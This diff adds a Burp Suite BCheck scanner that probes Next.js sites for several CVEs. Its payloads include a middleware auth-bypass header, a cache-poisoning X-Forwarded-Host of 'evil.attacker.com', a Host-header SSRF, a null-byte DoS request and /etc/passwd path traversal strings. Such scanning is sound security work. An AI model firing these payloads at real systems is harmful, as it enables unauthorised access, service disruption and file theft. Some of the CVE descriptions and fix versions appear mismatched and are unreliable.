@@ -1,0 +1,204 @@
+metadata:
+  language: v2-beta
+  name: "Next.js 13.x Vulnerability Scanner"
+  description: "Comprehensive BCheck for Next.js 13.x vulnerabilities including CVE-2025-29927, CVE-2024-46982, CVE-2024-34351, CVE-2023-46298, source map exposure, and __NEXT_DATA__ info leak"
+  author: "s3c4n0n"
+  tags: "nextjs", "auth-bypass", "ssrf", "dos", "cache-poisoning", "info-disclosure", "cve-2025-29927", "cve-2024-46982", "cve-2024-34351", "cve-2023-46298"
+
+########################################
+# 1. CVE-2025-29927 - Middleware Bypass
+########################################
+
+run for each:
+  protected_path =
+    "/admin",
+    "/dashboard",
+    "/profile",
+    "/account",
+    "/settings",
+    "/api/admin",
+    "/api/user",
+    "/api/protected"
+
+given request then
+  send request called mw_bypass {
+    replacing path: {protected_path}
+    replacing method: "GET"
+    appending headers:
+      "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"
+  }
+
+  if {mw_bypass.response.status_code} is "200" then
+    report issue:
+      severity: high
+      confidence: firm
+      detail: `CVE-2025-29927: Middleware auth bypass confirmed. Protected route accessible without authentication. Path: {protected_path}`
+      remediation: "Upgrade Next.js to 15.2.3 or later. Remove reliance on x-middleware-subrequest header checks."
+  end if
+end for each
+
+########################################
+# 2. CVE-2024-46982 - Cache Poisoning
+########################################
+
+run for each:
+  cache_path =
+    "/",
+    "/index",
+    "/home",
+    "/about",
+    "/api/data"
+
+given request then
+  send request called cache_poison {
+    replacing path: {cache_path}
+    replacing method: "GET"
+    appending headers:
+      "X-Forwarded-Host": "evil.attacker.com"
+      "X-Forwarded-Scheme": "https"
+  }
+
+  if {cache_poison.response.status_code} is "200" and
+     {cache_poison.response.body} matches "evil.attacker.com" then
+    report issue:
+      severity: high
+      confidence: firm
+      detail: `CVE-2024-46982: Cache poisoning via X-Forwarded-Host header. Attacker-controlled value reflected in response. Path: {cache_path}`
+      remediation: "Upgrade Next.js to 14.2.10 or later. Validate and sanitize forwarded headers."
+  end if
+end for each
+
+########################################
+# 3. CVE-2024-34351 - Host Header SSRF
+########################################
+
+define:
+  collaboratorHost = "YOUR_BURP_COLLABORATOR_HOST"
+
+run for each:
+  action_path =
+    "/api/auth",
+    "/api/submit",
+    "/api/contact",
+    "/api/newsletter",
+    "/api/callback",
+    "/api/webhook"
+
+given request then
+  send request called ssrf_check {
+    replacing path: {action_path}
+    replacing method: "POST"
+    appending headers:
+      "Host": {collaboratorHost}
+    replacing body: ""
+  }
+
+  if {ssrf_check.response.status_code} is "302" or
+     {ssrf_check.response.status_code} is "307" then
+    if {ssrf_check.response.headers} matches {collaboratorHost} then
+      report issue:
+        severity: high
+        confidence: firm
+        detail: `CVE-2024-34351: Host header SSRF confirmed. Server action redirecting to attacker-controlled host. Path: {action_path}`
+        remediation: "Upgrade Next.js to 14.1.1 or later. Validate Host header against allowlist."
+    end if
+  end if
+end for each
+
+########################################
+# 4. CVE-2023-46298 - Image Optimizer DoS
+########################################
+
+given request then
+  send request called dos_probe {
+    replacing path: "/_next/image"
+    replacing query: "url=%00&w=64&q=75"
+    replacing method: "GET"
+  }
+
+  if {dos_probe.response.status_code} is "500" or
+     {dos_probe.response.status_code} is "503" then
+    report issue:
+      severity: medium
+      confidence: firm
+      detail: "CVE-2023-46298: Next.js image optimizer crashed on null byte URL parameter. Server may be vulnerable to DoS via /_next/image endpoint."
+      remediation: "Upgrade Next.js to 13.4.1 or later."
+  end if
+
+########################################
+# 5. Source Map Exposure
+########################################
+
+run for each:
+  map_path =
+    "/_next/static/chunks/main.js.map",
+    "/_next/static/chunks/webpack.js.map",
+    "/_next/static/chunks/pages/_app.js.map",
+    "/_next/static/chunks/pages/_error.js.map",
+    "/_next/static/chunks/pages/index.js.map",
+    "/_next/static/chunks/framework.js.map"
+
+given request then
+  send request called map_check {
+    replacing path: {map_path}
+    replacing method: "GET"
+  }
+
+  if {map_check.response.status_code} is "200" and
+     {map_check.response.body} matches "mappings" then
+    report issue:
+      severity: medium
+      confidence: certain
+      detail: `Source map exposed publicly. Application source code is accessible and may contain internal logic, secrets, or API keys. Path: {map_path}`
+      remediation: "Set productionBrowserSourceMaps: false in next.config.js and redeploy."
+  end if
+end for each
+
+########################################
+# 6. __NEXT_DATA__ Sensitive Info Leak
+########################################
+
+given request then
+  if {base.response.body} matches "__NEXT_DATA__" then
+    if {base.response.body} matches "token" or
+       {base.response.body} matches "secret" or
+       {base.response.body} matches "password" or
+       {base.response.body} matches "apiKey" or
+       {base.response.body} matches "api_key" or
+       {base.response.body} matches "authorization" or
+       {base.response.body} matches "accessKey" or
+       {base.response.body} matches "private" then
+      report issue:
+        severity: high
+        confidence: tentative
+        detail: "Next.js __NEXT_DATA__ bootstrap JSON contains potentially sensitive keywords in page props. Review the page source for leaked tokens, credentials, or internal data."
+        remediation: "Audit all getServerSideProps and getStaticProps. Never pass sensitive server-side data to client props."
+    end if
+  end if
+
+########################################
+# 7. Path Traversal on Static Assets
+########################################
+
+run for each:
+  traversal_payload =
+    "/_next/static/../../../../etc/passwd",
+    "/_next/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "/_next/static/..%2F..%2F..%2Fetc%2Fpasswd",
+    "/_next/static/chunks/..%2F..%2F..%2Fetc%2Fpasswd"
+
+given request then
+  send request called traversal_check {
+    replacing path: {traversal_payload}
+    replacing method: "GET"
+  }
+
+  if {traversal_check.response.status_code} is "200" and
+     {traversal_check.response.body} matches "root:" then
+    report issue:
+      severity: critical
+      confidence: certain
+      detail: `Path traversal confirmed via Next.js static asset route. /etc/passwd contents returned. Payload: {traversal_payload}`
+      remediation: "Upgrade Next.js immediately and audit static file serving configuration."
+  end if
+end for each
